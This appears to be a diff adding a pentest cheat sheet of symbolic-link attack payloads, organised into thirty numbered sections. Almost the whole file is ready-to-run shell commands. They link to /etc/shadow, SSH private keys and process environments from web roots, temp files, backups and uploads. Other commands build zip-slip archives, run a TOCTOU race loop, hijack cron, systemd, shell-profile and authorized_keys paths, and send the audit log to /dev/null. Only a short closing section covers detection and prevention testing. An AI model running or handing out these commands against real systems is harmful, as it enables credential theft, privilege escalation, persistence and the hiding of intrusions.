@@ -1,0 +1,436 @@
+# Symbolic Link Attack Payloads
+
+# ============================================
+# 1. BASIC SYMLINK CREATION
+# ============================================
+
+# Create symlink to sensitive files
+ln -s /etc/passwd passwd_link.txt
+ln -s /etc/shadow shadow_link.txt
+ln -s /etc/hosts hosts_link.txt
+ln -s /root/.ssh/id_rsa root_key_link
+ln -s /home/user/.ssh/authorized_keys auth_keys_link
+
+# Symlink to directories
+ln -s /etc/ etc_link
+ln -s /root/ root_link
+ln -s / rootfs_link
+ln -s /var/log/ logs_link
+
+# ============================================
+# 2. TEMPORARY FILE SYMLINK ATTACKS
+# ============================================
+
+# Predict and create temp file symlinks
+ln -s /etc/passwd /tmp/app_12345.tmp
+ln -s /etc/shadow /tmp/temp_file_$$.tmp
+ln -s /root/.ssh/id_rsa /tmp/upload_temp.txt
+ln -s /etc/crontab /var/tmp/app_session
+
+# Common temp file patterns
+ln -s /etc/passwd /tmp/php_upload_12345
+ln -s /etc/passwd /tmp/mysql.sock
+ln -s /etc/passwd /var/tmp/sess_abcd1234
+
+# ============================================
+# 3. LOG FILE SYMLINK ATTACKS
+# ============================================
+
+# Replace log files with symlinks
+ln -s /etc/passwd /var/log/app.log
+ln -s /etc/shadow /var/log/error.log
+ln -s /home/user/.ssh/authorized_keys /var/log/access.log
+ln -s /etc/crontab /var/log/system.log
+
+# Symlink to /dev/null for DoS
+ln -s /dev/null /var/log/app.log
+
+# Symlink to /dev/zero for infinite data
+ln -s /dev/zero /var/log/app.log
+
+# ============================================
+# 4. WEB ROOT SYMLINK ATTACKS
+# ============================================
+
+# Create symlinks in web directories
+ln -s /etc/passwd /var/www/html/passwd.txt
+ln -s /etc/shadow /var/www/html/shadow.txt
+ln -s /root/.ssh/id_rsa /var/www/html/key.txt
+ln -s /home/user/.bash_history /var/www/html/history.txt
+ln -s /var/log/apache2/access.log /var/www/html/access.txt
+
+# Symlink to entire directories
+ln -s /etc/ /var/www/html/etc
+ln -s /root/ /var/www/html/root
+ln -s /home/ /var/www/html/home
+
+# PHP uploads directory
+ln -s /etc/passwd /var/www/html/uploads/passwd.txt
+ln -s /etc/passwd /var/www/html/files/config.txt
+
+# ============================================
+# 5. CONFIGURATION FILE SYMLINK
+# ============================================
+
+# Replace config files
+ln -s /tmp/attacker_config /etc/app/app.conf
+ln -s /tmp/evil.ini /etc/app/database.ini
+ln -s /tmp/settings.xml /etc/app/settings.xml
+
+# MySQL config
+ln -s /tmp/evil.cnf /etc/mysql/my.cnf
+
+# Apache config
+ln -s /tmp/evil.conf /etc/apache2/sites-enabled/000-default.conf
+
+# ============================================
+# 6. SSH KEY INJECTION SYMLINKS
+# ============================================
+
+# Symlink authorized_keys
+ln -s /tmp/attacker_keys /home/victim/.ssh/authorized_keys
+ln -s /tmp/attacker_keys /root/.ssh/authorized_keys
+
+# Symlink SSH config
+ln -s /tmp/evil_ssh_config /home/user/.ssh/config
+
+# Symlink known_hosts
+ln -s /dev/null /home/user/.ssh/known_hosts
+
+# ============================================
+# 7. ARCHIVE EXTRACTION SYMLINKS (ZIP SLIP)
+# ============================================
+
+# Bash commands to create malicious archives
+
+# Tar archive with symlink to /etc/passwd
+ln -s /etc/passwd evil_link.txt
+tar -czf evil.tar.gz evil_link.txt
+
+# Tar with absolute path symlink
+ln -s /etc/shadow /tmp/shadow_link
+tar -czf evil.tar.gz /tmp/shadow_link
+
+# Tar with directory traversal symlink
+mkdir -p a/b/c
+ln -s ../../../etc/passwd a/b/c/passwd
+tar -czf evil.tar.gz a/
+
+# Zip with symlink
+ln -s /etc/passwd passwd_link
+zip --symlinks evil.zip passwd_link
+
+# Zip with path traversal
+ln -s ../../../../../../etc/passwd link
+zip --symlinks evil.zip link
+
+# ============================================
+# 8. BACKUP SYMLINK ATTACKS
+# ============================================
+
+# Place symlinks in backup source directory
+cd /home/user/backup_source/
+ln -s /etc/shadow shadow_backup.txt
+ln -s /root/.ssh/id_rsa root_key.txt
+ln -s /var/log/auth.log auth_log.txt
+ln -s /etc/mysql/debian.cnf mysql_creds.txt
+
+# Symlink entire sensitive directories
+ln -s /root/.ssh/ ssh_dir_backup
+ln -s /etc/ etc_backup
+
+# ============================================
+# 9. CACHE DIRECTORY SYMLINKS
+# ============================================
+
+# Replace cache files with symlinks
+ln -s /etc/passwd /tmp/app_cache/user_data
+ln -s /home/victim/.ssh/authorized_keys /var/cache/app/session_123
+ln -s /etc/crontab /var/tmp/cache/data_456
+
+# ============================================
+# 10. FILE UPLOAD SYMLINK EXPLOITATION
+# ============================================
+
+# Create symlinks for upload testing
+ln -s /etc/passwd upload_passwd.txt
+ln -s /etc/shadow upload_shadow.txt
+ln -s /root/.ssh/id_rsa upload_key.pem
+ln -s /proc/self/environ upload_env.txt
+
+# Symlink with allowed extension
+ln -s /etc/passwd document.pdf
+ln -s /etc/passwd image.jpg
+ln -s /etc/passwd file.txt
+
+# ============================================
+# 11. TOCTOU RACE CONDITION PAYLOADS
+# ============================================
+
+# Continuous race condition exploit
+while true; do
+  rm -f /tmp/target_file 2>/dev/null
+  touch /tmp/target_file
+  rm -f /tmp/target_file
+  ln -s /etc/passwd /tmp/target_file
+  sleep 0.001
+done
+
+# Python TOCTOU exploit
+# import os, time
+# while True:
+#     try:
+#         os.remove('/tmp/target')
+#         open('/tmp/target', 'w').close()
+#         os.remove('/tmp/target')
+#         os.symlink('/etc/passwd', '/tmp/target')
+#     except: pass
+
+# ============================================
+# 12. SYMLINK DIRECTORY TRAVERSAL
+# ============================================
+
+# Create symlink chains for traversal
+mkdir -p /tmp/uploads/a/b/c/d/e
+cd /tmp/uploads
+ln -s / a/b/c/d/e/root
+
+# Multiple level traversal
+ln -s ../../../../../../../etc/passwd link1.txt
+ln -s ../../../../../../etc/shadow link2.txt
+
+# Relative path symlinks
+cd /var/www/html/uploads
+ln -s ../../../etc/passwd passwd.txt
+
+# ============================================
+# 13. CRON JOB SYMLINK ATTACKS
+# ============================================
+
+# Symlink crontab
+ln -s /tmp/evil_cron /var/spool/cron/crontabs/root
+ln -s /tmp/attacker_cron /etc/cron.d/custom
+
+# Symlink cron scripts
+ln -s /tmp/evil_script.sh /etc/cron.daily/backup
+
+# ============================================
+# 14. DATABASE SYMLINK ATTACKS
+# ============================================
+
+# MySQL data directory symlinks
+ln -s /etc/passwd /var/lib/mysql/database/table.MYD
+
+# PostgreSQL symlinks
+ln -s /etc/shadow /var/lib/postgresql/data/pg_hba.conf
+
+# SQLite database symlinks
+ln -s /etc/passwd /var/www/app/database.sqlite
+
+# ============================================
+# 15. SESSION FILE SYMLINKS
+# ============================================
+
+# PHP session symlinks
+ln -s /etc/passwd /var/lib/php/sessions/sess_abc123
+ln -s /tmp/attacker_session /var/lib/php/sessions/sess_victim
+
+# Application session symlinks
+ln -s /etc/shadow /tmp/sessions/user_session_123
+
+# ============================================
+# 16. PACKAGE/DEPENDENCY SYMLINKS
+# ============================================
+
+# NPM/Node modules
+ln -s /tmp/evil_module /var/www/app/node_modules/package
+
+# Python site-packages
+ln -s /tmp/evil_module.py /usr/lib/python3/site-packages/module.py
+
+# ============================================
+# 17. SYSTEMD/INIT SYMLINKS
+# ============================================
+
+# Systemd service symlinks
+ln -s /tmp/evil.service /etc/systemd/system/app.service
+
+# Init script symlinks
+ln -s /tmp/evil_script /etc/init.d/custom_service
+
+# ============================================
+# 18. MAIL SPOOL SYMLINKS
+# ============================================
+
+# Mail spool symlinks
+ln -s /etc/shadow /var/mail/root
+ln -s /root/.ssh/id_rsa /var/spool/mail/user
+
+# ============================================
+# 19. PRINTER/DEVICE SYMLINKS
+# ============================================
+
+# Symlink to devices
+ln -s /dev/random /tmp/data_file
+ln -s /dev/zero /var/log/app.log
+ln -s /dev/null /tmp/output.txt
+
+# Printer spool
+ln -s /etc/passwd /var/spool/cups/tmp/job_123
+
+# ============================================
+# 20. DOCKER/CONTAINER SYMLINKS
+# ============================================
+
+# Docker volume symlinks
+ln -s /etc/passwd /var/lib/docker/volumes/app/_data/config.txt
+
+# Container mount symlinks
+ln -s /host/etc/passwd /container/app/data/passwd.txt
+
+# ============================================
+# 21. GIT REPOSITORY SYMLINKS
+# ============================================
+
+# Git hooks symlinks
+ln -s /tmp/evil_hook.sh /var/www/app/.git/hooks/pre-commit
+
+# Git config symlinks
+ln -s /tmp/evil_config /var/www/app/.git/config
+
+# ============================================
+# 22. COMPILER/BUILD SYMLINKS
+# ============================================
+
+# Include file symlinks
+ln -s /etc/passwd /usr/include/config.h
+
+# Library symlinks
+ln -s /tmp/evil.so /usr/lib/libapp.so
+
+# ============================================
+# 23. BROWSER CACHE SYMLINKS
+# ============================================
+
+# Browser profile symlinks
+ln -s /etc/passwd ~/.mozilla/firefox/profile/prefs.js
+ln -s /etc/shadow ~/.config/google-chrome/Default/Preferences
+
+# ============================================
+# 24. SETUID/SETGID SYMLINKS
+# ============================================
+
+# Symlinks to setuid binaries (for analysis)
+ln -s /usr/bin/sudo /tmp/sudo_link
+ln -s /usr/bin/passwd /tmp/passwd_link
+
+# ============================================
+# 25. PROCFS SYMLINKS
+# ============================================
+
+# Process information symlinks
+ln -s /proc/self/environ /var/www/html/env.txt
+ln -s /proc/self/cmdline /tmp/cmdline.txt
+ln -s /proc/self/cwd /tmp/cwd_link
+ln -s /proc/self/fd/0 /tmp/stdin_link
+
+# ============================================
+# 26. NETWORK CONFIGURATION SYMLINKS
+# ============================================
+
+# Network config symlinks
+ln -s /tmp/evil_hosts /etc/hosts
+ln -s /tmp/evil_resolv /etc/resolv.conf
+ln -s /tmp/evil_network /etc/network/interfaces
+
+# ============================================
+# 27. USER PROFILE SYMLINKS
+# ============================================
+
+# Shell profile symlinks
+ln -s /tmp/evil_bashrc /home/user/.bashrc
+ln -s /tmp/evil_profile /home/user/.profile
+ln -s /tmp/evil_zshrc /home/user/.zshrc
+
+# ============================================
+# 28. MONITORING/AUDIT SYMLINKS
+# ============================================
+
+# Audit log symlinks
+ln -s /dev/null /var/log/audit/audit.log
+
+# Monitoring config symlinks
+ln -s /tmp/evil_config /etc/nagios/nrpe.cfg
+
+# ============================================
+# 29. CLOUD METADATA SYMLINKS
+# ============================================
+
+# AWS metadata symlinks (if accessible)
+ln -s /proc/self/environ /var/www/html/aws_metadata.txt
+
+# ============================================
+# 30. RECURSIVE SYMLINK (DoS)
+# ============================================
+
+# Create circular symlinks for DoS
+ln -s /tmp/link1 /tmp/link2
+ln -s /tmp/link2 /tmp/link1
+
+# Self-referential symlink
+ln -s /tmp/selflink /tmp/selflink
+
+# ============================================
+# TESTING COMMANDS
+# ============================================
+
+# Check if file is a symlink
+test -L /path/to/file && echo "Is a symlink"
+
+# List symlinks
+find /path -type l
+
+# Show symlink target
+readlink /path/to/symlink
+ls -l /path/to/symlink
+
+# Create symlink with specific name
+ln -s /target /symlink_name
+
+# Force create symlink (overwrite existing)
+ln -sf /target /symlink_name
+
+# Create relative symlink
+ln -sr /target /symlink_name
+
+# ============================================
+# PREVENTION TESTING
+# ============================================
+
+# Test if application follows symlinks
+ln -s /etc/passwd /tmp/test_symlink.txt
+# Upload/access /tmp/test_symlink.txt
+# If contents of /etc/passwd are returned, vulnerable
+
+# Test O_NOFOLLOW behavior
+# Create symlink and try to open it
+# Should fail with ELOOP error if protected
+
+# Test path validation
+ln -s /etc/passwd allowed_dir/../../etc/passwd_link
+# Try to access via application
+
+# ============================================
+# WINDOWS EQUIVALENTS (JUNCTION/MKLINK)
+# ============================================
+
+# Windows symbolic links (requires admin)
+# mklink /D link target_directory
+# mklink file_link target_file
+
+# Windows junctions (no admin required)
+# mklink /J junction_dir target_directory
+
+# Example payloads (Windows)
+# mklink passwd.txt C:\Windows\System32\config\SAM
+# mklink /D sensitive_dir C:\Users\Administrator
